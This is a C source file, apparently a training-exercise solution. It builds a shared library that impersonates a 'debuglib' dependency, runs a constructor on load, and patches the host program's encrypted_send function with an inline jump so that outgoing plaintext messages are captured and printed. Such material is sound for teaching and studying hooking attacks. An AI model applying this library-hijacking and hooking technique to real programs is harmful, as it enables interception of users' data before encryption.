#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <ctype.h>
#include <elf.h>
#include <sys/socket.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <dlfcn.h>

#define BUF_SIZE			0x1000
#define MAX_ADDR_FMT_LEN	16
#define DUMP_COLS			16

__attribute__((constructor)) void on_load(void);
__attribute__((destructor)) void on_unload(void);
int debug(char* param);
void hexdump(const unsigned char* buf, unsigned int len);
void patch_code(void* target, void* patch, unsigned long len);
void write_absolute_jump(void* jump_from, void* jump_to);
void* get_main_image_addr(void);
ssize_t my_encrypted_send(int sock, char* msg);

int debug(char* param) {
	printf("Pfffttt... I ain't the real debuglib\n");
	return 0;
}

void on_load(void) {
	void* encrypted_send_addr;
	printf("Injected lib running...\n");

	/* we use dlsym here to not have to update our solution as the
	 * main binary changes. If doing this with a binary that did not
	 * export its own symbols to shared libraries, we could simply
	 * call get_main_image_addr and add the offset of encrypted_send
	 * to the result to get the address of encrypted_send */
	encrypted_send_addr = dlsym(NULL, "encrypted_send");
	printf("Address of encrypted_send is %p\n", encrypted_send_addr);
	write_absolute_jump(encrypted_send_addr, my_encrypted_send);
	printf("Patched encrypted_send\n");
	return;
}

void on_unload(void) {
	printf("Unloading\n");
	return;
}

ssize_t my_encrypted_send(int sock, char* msg) {
	printf("I'm in your codez, stealin ur stuff\n");
	printf("msg is %s\n", msg);
	return 0;
}

void hexdump(const unsigned char* buf, unsigned int len) {
	char addr_buf[MAX_ADDR_FMT_LEN + 1];
	unsigned int i;
	unsigned int j;
	unsigned int power;
	unsigned int limit;
	unsigned int pad;
	char c;
	power = 1;
	for (i = 0; i < 64; i++) {
		if (len >= power) {
			power = power << 2;
			continue;
		}
		break;
	}
	snprintf(addr_buf, MAX_ADDR_FMT_LEN, "%%0%ullx:", i);
	for (i = 0; i < len; i++) {
		if (i % DUMP_COLS == 0) {
			printf(addr_buf, i);
		}
		if (i % 2 == 0) printf(" ");
		printf("%02x", buf[i]);
		if (i % DUMP_COLS == DUMP_COLS-1 || i == (len - 1)) {
			limit = (i % DUMP_COLS);
			pad = DUMP_COLS - limit;
			if (i == (len - 1)) {
				for (j = 0; j < pad-1; j++) {
					if (j % 2 != 0) {
						printf(" ");
					}
					printf("  ");
				}
			}
			printf("  ");
			for (j = 0; j <= limit; j++) {
				c = buf[i-limit+j];
				if (isalnum(c)) {
					printf("%c", c);
				}
				else {
					printf(".");
				}
			}
			printf("\n");
		}
	}
	printf("\n");
}

void patch_code(void* target, void* patch, unsigned long len) {
	void* target_page = (void*)((size_t)target & 0xfffffffffffff000);
	unsigned long protlen = len + (target - target_page);

	fprintf(stderr,
			"target_page:%p\ntarget:%p\ntarget-target_page:%d\n",
			target_page, target, (target-target_page));

	if (mprotect(target_page, protlen, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		fprintf(stderr, "Failed to change permissions of memory before patch:\n%s\n", strerror(errno));
	}
	memcpy(target, patch, len);
	if (mprotect(target_page, protlen, PROT_READ | PROT_EXEC) == -1) {
		fprintf(stderr, "Failed to change permissions of memory back to original:\n%s\n", strerror(errno));
	}
	return;
}

void write_absolute_jump(void* jump_from, void* jump_to) {
	/*	currently:
	 *		movabs rax, 0x0000000000000000
	 *		jmp rax */
	unsigned char jmp_template[] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0};
	*((uint64_t*)(jmp_template + 2)) = (uint64_t)(jump_to);
	patch_code(jump_from, jmp_template, 12);
	return;
}

void* get_main_image_addr(void) {
	FILE* stream = NULL;
	unsigned char buf[BUF_SIZE];
	void* main_image_addr = NULL;
	char* eoi_char = NULL;

	stream = fopen("/proc/self/maps", "rb");
	if (stream == NULL) {
		fprintf(stderr, "Failure opening maps file\n");
		return NULL;
	}

	if (fread(buf, 1, BUF_SIZE, stream) <= 0) {
		fprintf(stderr, "Failed to read file\n");
		fclose(stream);
		return NULL;
	}
	fclose(stream);
	
	main_image_addr = (void *)strtol(buf, &eoi_char, 16);
	if (eoi_char == NULL || *eoi_char != '-') {
		fprintf(stderr, "Couldn't find main image address\n");
		return NULL;
	}
	return main_image_addr;
}

